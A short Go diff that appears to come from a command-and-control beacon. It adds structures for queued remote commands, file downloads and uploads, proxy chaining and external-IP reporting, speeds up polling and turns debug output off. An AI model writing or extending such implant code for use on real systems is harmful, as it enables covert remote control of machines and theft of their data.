@@ -6,17 +6,26 @@ import (
 	"encoding/json"
 )
 
-const idBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+type Beacon struct {
+	Ip string
+	Id string
+	ProxyClients []Beacon
+	ExecBuffer []string
+	DownloadBuffer []string
+	UploadBuffer []string
+	LastSeen time.Time
+}
 
-var msPerUpdate int = 5000
-var idLen int = 8
+var msPerUpdate int = 500
+var cmdProxyIp string
+var cmdProxyId string
 var cmdAddress string
 var cmdPort string
 var cmdHost string
 var id string
 var ip string
 var queryData string
-var debug bool = true
+var debug bool = false
 var netClient = &http.Client{
 	Timeout: time.Second * 10,
 }
@@ -29,7 +38,6 @@ func main() {
 	lhost, err := externalIP()
 	debugFatal(err)
 	ip = lhost
-	id = genRandID()
 	jsonData, err := json.Marshal(CommandUpdate{ip,id,"",nil})
 	debugFatal(err)
 	
